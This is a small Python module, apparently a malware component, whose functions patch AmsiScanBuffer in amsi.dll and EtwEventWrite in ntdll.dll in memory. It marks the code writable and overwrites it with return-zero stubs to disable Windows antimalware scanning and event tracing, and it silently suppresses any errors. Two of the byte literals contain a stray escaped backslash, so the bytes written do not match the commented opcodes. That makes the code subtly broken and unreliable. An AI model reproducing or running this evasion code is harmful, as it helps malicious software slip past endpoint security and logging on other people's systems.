import ctypes
import platform


def patch_amsi():
    if platform.system() != "Windows":
        return
    try:
        amsi_dll = ctypes.windll.kernel32.LoadLibraryW("amsi.dll")
        amsi_scan_buffer = ctypes.windll.kernel32.GetProcAddress(
            amsi_dll, b"AmsiScanBuffer"
        )
        patch = b"\x31\\c0\xc3"  # xor eax, eax; ret
        old_protect = ctypes.c_ulong()
        ctypes.windll.kernel32.VirtualProtect(
            amsi_scan_buffer, len(patch), 0x40, ctypes.byref(old_protect)
        )
        ctypes.memmove(amsi_scan_buffer, patch, len(patch))
    except Exception:
        pass


def patch_etw():
    if platform.system() != "Windows":
        return
    try:
        ntdll = ctypes.windll.kernel32.LoadLibraryW("ntdll.dll")
        etw_event_write = ctypes.windll.kernel32.GetProcAddress(ntdll, b"EtwEventWrite")
        patch = b"\x48\x33\\c0\xc3"  # xor rax, rax; ret
        old_protect = ctypes.c_ulong()
        ctypes.windll.kernel32.VirtualProtect(
            etw_event_write, len(patch), 0x40, ctypes.byref(old_protect)
        )
        ctypes.memmove(etw_event_write, patch, len(patch))
    except Exception:
        pass


def apply_evasion():
    patch_amsi()
    patch_etw()
